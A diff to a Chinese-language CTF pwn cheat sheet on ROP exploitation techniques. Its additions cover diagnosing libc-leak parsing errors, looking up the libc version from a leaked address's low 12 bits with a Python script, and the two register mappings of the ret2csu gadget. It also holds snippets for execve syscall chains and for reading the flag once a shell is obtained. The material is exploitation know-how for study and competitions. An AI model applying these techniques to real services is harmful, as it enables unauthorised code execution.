@@ -17,10 +17,13 @@ summary: 卡点决定手法——没 libc 就两阶段泄、没 gadget 就 ret2c
 | 不知道 libc 版本 | 两阶段：`puts@plt` 泄 GOT → 重入 → 打一发 | §1 |
 | 泄完回不到第二次输入 | 返回 `main` 里 `call vuln` 那条指令 | §1 |
 | 泄出来的字节前面粘了别的输出 | `printf` 没尾换行，`recvuntil` 前缀再 `recvline` | §1 |
+| 泄出的地址低 12 位畸变、任何 libc 都对不上 | 提示串带尾换行而 `recvuntil` 没含换行，泄漏首字节多了 `\n` | §1 |
+| 泄露地址与记忆里的 libc 偏移差一个小量 | 按低 12 位反查 libc 库，别硬套记忆偏移 | §1 |
 | 调 `system()`/`execve()` 就 SIGSEGV | 走裸 `syscall`，绕过 libc 序言与 CET | §2 |
 | 找不到 `pop rdx; ret` | 找 `pop rdx; pop rbx; ret`（glibc 2.35 约 `0x904a9`） | §2 |
 | 调完 `puts` 后 `rdx` 被踩成 1 | 三种解法：libc gadget / 重入 `read` / `leave` 枢轴 | §3 |
 | 二进制里一个 `pop rdx` 都没有 | `__libc_csu_init` 两段 gadget | §4 |
+| ret2csu 填完参数直接崩、且**零输出** | 先反汇编确认该构建的 csu 寄存器映射，别按标准映射填 | §4 |
 | payload 不能含 null/换行/空格 | XOR 编码后原地解，或 `sprintf` 逐字节拼 | §5 |
 | 连 `mov [reg],reg` 都没有 | `BEXTR`+`XLAT`+`STOSB` / `PEXT` | §5 |
 | 缓冲区装不下整条链 | `xchg rax,esp` 枢轴（注意 32 位截断） | §6 |
@@ -54,6 +57,22 @@ libc.address = u64(leaked.ljust(8, b'\x00')) - libc.sym['puts']
 ```
 
 用 `recvline()` 而不 `recv(6)` 也行，但必须先吃掉前缀，否则 `u64` 会读到 `e` 和空格。
+
+**反过来，提示串本身带尾换行时**：`recvuntil(b'prompt:')`（少了 `\n`）会把残留的 `\n` 当成泄漏的第一个字节，`u64` 出来的地址整体左移一字节、低 12 位变成 `0x?0a` 这类畸形值，然后**任何 libc 库都匹配不上**。判据就是「低 12 位看着不像正常函数偏移」。修法：`recvuntil(b'prompt:\n')`，或解析前先剥掉前导 `\n`。
+
+**libc 版本判定不要按记忆硬套偏移**。同一个发行版的不同 minor 补丁版（如 `2.23-0ubuntu3` 与 `2.23-0ubuntu11.3`）符号偏移差一个很小的量，按记忆填会让基址整体偏移、后续 ROP 全崩。正解是拿泄漏值的**低 12 位**去本地 libc 库里反查（页内偏移不随 ASLR 变），命中后再用「基址必须页对齐」交叉校验：
+
+```python
+leak = u64(data[:6].ljust(8, b'\x00'))
+page_off = leak & 0xfff
+for path in glob('/opt/libc-db/*/libc*.so*'):     # 任意 libc 集合
+    sym = sym_offset(path, 'puts')                # 读 .dynsym
+    base = leak - sym
+    if sym & 0xfff == page_off and base & 0xfff == 0:
+        print(path, hex(sym), hex(base))
+```
+
+命中应当唯一；命中多个说明收集的库有重复版本，再用第二个泄漏符号交叉确认。
 
 ## 2. 裸 syscall ROP
 
@@ -97,19 +116,28 @@ payload += flat(pop_rax, 59,                                   # execve
 pop rbx        ; 填 0
 pop rbp        ; 填 1
 pop r12        ; 要调的函数指针（通常填 GOT 项地址）
-pop r13        ; → edi
-pop r14        ; → rsi
-pop r15        ; → rdx
+pop r13        ; → 下面搬运段决定的寄存器之一
+pop r14        ; → rsi（各构建一致）
+pop r15        ; → 下面搬运段决定的寄存器之一
 ret
 
 ; gadget 2：搬运并调用
-mov rdx, r15
+mov rdx, <r13 或 r15>
 mov rsi, r14
-mov edi, r13d
+mov edi, <r15d 或 r13d>
 call qword ptr [r12 + rbx*8]
 ```
 
 用法：gadget 1 弹满 6 个值 → gadget 2 搬进寄存器 → `call [r12+rbx*8]`。**`rbx` 必须是 0，`rbp` 必须是 1**，否则 `call` 之后那段 `add rbx,1; cmp rbp,rbx; jne` 循环会跑飞。填 `r12 = GOT['puts']` 就是 `call puts@plt` 的效果，不需要 PLT 地址。
+
+**搬运段的寄存器映射不是唯一的**，随 gcc 版本与 `__libc_csu_init` 的寄存器分配而变，至少存在两种形态：
+
+| 形态 | 第 1 参数 | 第 2 参数 | 第 3 参数 |
+|---|---|---|---|
+| A | `edi ← r13d` | `rsi ← r14` | `rdx ← r15` |
+| B | `edi ← r15d` | `rsi ← r14` | `rdx ← r13` |
+
+**动手填参前必须 `objdump -d` 把这段真读一遍**，照抄当前二进制里的 `mov` 顺序，不要照抄任何笔记。填错的表现很特殊：**进程直接崩掉且没有任何输出**（不是报错、不是乱码），看起来像「ret2csu 这条路不通」，于是很容易去换整条思路——实际只是两个寄存器填反了。判据：把 `r15`/`r13` 互换再试一次就通。
 
 代价：一次只能设 3 个参数，且中间要吞掉 7 个 qword 的栈槽。只在真没别的 gadget 时用。
 
@@ -223,7 +251,7 @@ system_addr = d.lookup('system', 'libc')
 binsh_addr  = d.lookup(None, 'libc')
 ```
 
-`DynELF` 自己解析 `.dynamic` → link_map → 符号表，不需要 libc 文件。代价是每次 `lookup` 都发很多次请求，慢；能拿到 libc 文件时优先直接对版本。
+`DynELF` 自己解析 `.dynamic` → link_map → 符号表，不需要 libc 文件。代价是每次 `lookup` 都发很多次请求，慢；能拿到 libc 文件时优先直接对版本（判据与反查脚本见 §1）。
 
 ## 8. 小空间 shellcode
 
@@ -334,6 +362,6 @@ p.sendline(b'cat /flag* flag* 2>/dev/null')
 
 - **先定卡点再选手法**。上面 20 行判据表就是决策树，别上来就 `ROP(elf).chain()`。
 - **gadget 不够是常态，不是异常**。缺 `pop rdx` 走 ret2csu、缺写原语走 `XLAT/STOSB`、缺 `pop rax` 走返回值——每一类都有成熟替代。
-- **两阶段永远先验证第一阶段**：泄出的 6 字节要对得上 `libc.sym['puts']` 的低 12 位（`0x?e50` 之类），对不上说明返回目标选错或解析偏了一位。
-- **报的是「哪个寄存器没设对」，不是「ROP 不工作」**。崩在 `movaps` = 对齐；崩在 `syscall` 后 = 参数；崩在 `ret` = 栈被踩。
+- **两阶段永远先验证第一阶段**：泄出的 6 字节要对得上 libc 里该函数的低 12 位，对不上说明返回目标选错、`recvuntil` 少吃了换行、或库版本不对（按 §1 反查）。
+- **报的是「哪个寄存器没设对」，不是「ROP 不工作」**。崩在 `movaps` = 对齐；崩在 `syscall` 后 = 参数；崩在 `ret` = 栈被踩；崩得悄无声息 = 多半是 csu 搬运段填反（§4）。
 - **shellcode 字节数要数**，15 字节方案里每个指令都是被逼出来的，别随手加 `xor`。
